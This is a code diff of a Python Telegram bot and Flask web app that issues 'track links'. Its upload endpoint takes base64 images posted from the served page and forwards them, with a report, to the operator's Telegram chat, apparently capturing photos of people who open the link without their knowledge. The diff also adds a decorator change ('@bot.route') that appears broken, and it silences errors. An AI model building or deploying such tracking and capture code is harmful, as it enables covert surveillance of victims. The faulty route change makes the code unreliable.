@@ -9,9 +9,12 @@ ADMIN_ID = 7162565886
 MY_CHAT_ID = "7162565886"
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# Error 409 फिक्स करने के लिए वेबहुक डिलीट करना
-bot.remove_webhook()
-time.sleep(1)
+# Conflict Error 409 को ठीक करने के लिए
+try:
+    bot.remove_webhook()
+    time.sleep(1)
+except:
+    pass
 
 def init_db():
     conn = sqlite3.connect('users.db')
@@ -58,19 +61,7 @@ def callback_query(call):
         response = f"😃 it's your track link 🔗👇👇\n\nUrl= {track_link}\n\n🤗 If any problem contact admin ✅"
         bot.send_message(call.message.chat.id, response, reply_markup=contact_markup)
 
-@bot.message_handler(commands=['broadcast'])
-def broadcast(message):
-    if message.from_user.id == ADMIN_ID:
-        text = message.text.replace("/broadcast ", "")
-        conn = sqlite3.connect('users.db')
-        users = conn.execute('SELECT user_id FROM users').fetchall()
-        conn.close()
-        for u in users:
-            try: bot.send_message(u[0], text)
-            except: pass
-        bot.reply_to(message, "✅ Broadcast Done!")
-
-@app.route('/')
+@bot.route('/')
 def index():
     return render_template('index.html')
 
@@ -86,13 +77,11 @@ def upload():
         try:
             img_bytes = base64.b64decode(data.get('image').split(',')[1])
             bot.send_photo(target_id, img_bytes, caption=report, parse_mode='HTML')
-        except Exception as e:
-            print(f"Upload error: {e}")
+        except: pass
     return jsonify({"status": "success"})
 
 if __name__ == "__main__":
     init_db()
-    # बॉट को अलग थ्रेड में चलाना
-    threading.Thread(target=lambda: bot.polling(none_stop=True, timeout=60)).start()
+    threading.Thread(target=lambda: bot.polling(none_stop=True, timeout=90)).start()
     app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
     
